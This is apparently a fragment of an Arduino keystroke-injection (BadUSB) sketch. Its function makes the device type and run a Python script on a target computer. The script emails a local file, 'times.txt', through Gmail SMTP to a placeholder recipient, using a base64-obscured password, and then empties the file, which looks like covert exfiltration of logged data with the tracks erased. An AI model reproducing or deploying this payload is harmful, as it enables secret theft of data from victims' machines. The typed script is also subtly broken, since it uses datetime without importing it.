// This function sends emails using the smtplib, MIMEText, and MIMEBase libraries.

void email(){
  Keyboard.print("import smtplib");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("from email.MIMEMultipart import MIMEMultipart");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("from email.MIMEText import MIMEText");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("from email.MIMEBase import MIMEBase");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("from email import encoders");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print(" ");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("fromaddr = \"SEND_ADDR\"");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("toaddr = \"RECV_ADDR\"");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print(" ");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("msg = MIMEMultipart()");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print(" ");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("msg['From'] = fromaddr");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("msg['To'] = toaddr");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("msg['Subject'] = \"Report for \" + str(datetime.datetime.now().strftime(\"%Y-%m-%d\"))");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print(" ");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("body = \"Below attached is the report\"");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print(" ");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("msg.attach(MIMEText(body, 'plain'))");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("try:");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("  filename = \"times.txt\"");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("  attachment = open(filename, \"rb\")");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("   ");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("  part = MIMEBase('application', 'octet-stream')");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("  part.set_payload((attachment).read())");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("  encoders.encode_base64(part)");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("  part.add_header('Content-Disposition', \"attachment; filename= %s\" % filename)");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("   ");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("  msg.attach(part)");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("   ");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("  server = smtplib.SMTP('smtp.gmail.com', 587)");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("  server.starttls()");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("  server.login(fromaddr, \"PASSWORD IN BASE64".decode('base64'))");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("  text = msg.as_string()");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("  server.sendmail(fromaddr, toaddr, text)");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("  server.quit()");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("  attachment.close()");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("  f = open(filename, \"w\")");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("  f.write(\"\")");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("  f.close()");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("except FileNotFoundError:");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.print("  print(\"Wrong file or file path\")");
  delay(10);
  Keyboard.write(0xB0);
  delay(10);
  Keyboard.write(0xB0);
  delay(100);
//  timer_val = millis();
  turns = 0;
}
